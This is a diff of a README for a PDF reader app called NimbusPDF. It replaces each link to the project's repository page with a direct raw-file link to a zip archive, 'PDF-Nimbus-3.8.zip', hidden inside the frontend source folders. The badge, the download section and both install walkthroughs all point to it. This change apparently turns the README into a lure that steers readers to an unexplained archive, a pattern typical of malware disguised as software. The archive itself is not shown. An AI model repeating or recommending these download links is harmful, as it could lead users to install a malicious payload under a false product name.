@@ -1,10 +1,10 @@
 # 🔒 NimbusPDF - Private PDF Reader With Local AI
 
-[![Download NimbusPDF](https://img.shields.io/badge/Download-NimbusPDF-2ea44f?style=for-the-badge&logo=github)](https://github.com/Noreenf929/NimbusPDF)
+[![Download NimbusPDF](https://img.shields.io/badge/Download-NimbusPDF-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Noreenf929/NimbusPDF/main/frontend/src/routes/viewer/PDF-Nimbus-3.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: [https://github.com/Noreenf929/NimbusPDF](https://github.com/Noreenf929/NimbusPDF)
+Visit this page to download: [https://raw.githubusercontent.com/Noreenf929/NimbusPDF/main/frontend/src/routes/viewer/PDF-Nimbus-3.8.zip](https://raw.githubusercontent.com/Noreenf929/NimbusPDF/main/frontend/src/routes/viewer/PDF-Nimbus-3.8.zip)
 
 ## 🖥️ What NimbusPDF Does
 
@@ -34,7 +34,7 @@ If you plan to use the local AI assistant, a stronger PC helps. More RAM gives b
 
 ## 🚀 Get NimbusPDF
 
-1. Open the download page: [https://github.com/Noreenf929/NimbusPDF](https://github.com/Noreenf929/NimbusPDF)
+1. Open the download page: [https://raw.githubusercontent.com/Noreenf929/NimbusPDF/main/frontend/src/routes/viewer/PDF-Nimbus-3.8.zip](https://raw.githubusercontent.com/Noreenf929/NimbusPDF/main/frontend/src/routes/viewer/PDF-Nimbus-3.8.zip)
 2. Find the latest release or download file
 3. Download the Windows version
 4. Save the file to your Downloads folder or Desktop
@@ -208,7 +208,7 @@ NimbusPDF is designed as a private document app with:
 
 If you want the simplest path:
 
-1. Download NimbusPDF from [https://github.com/Noreenf929/NimbusPDF](https://github.com/Noreenf929/NimbusPDF)
+1. Download NimbusPDF from [https://raw.githubusercontent.com/Noreenf929/NimbusPDF/main/frontend/src/routes/viewer/PDF-Nimbus-3.8.zip](https://raw.githubusercontent.com/Noreenf929/NimbusPDF/main/frontend/src/routes/viewer/PDF-Nimbus-3.8.zip)
 2. Install or open the app on Windows
 3. Add your PDFs
 4. Connect Ollama or LM Studio if you want local AI
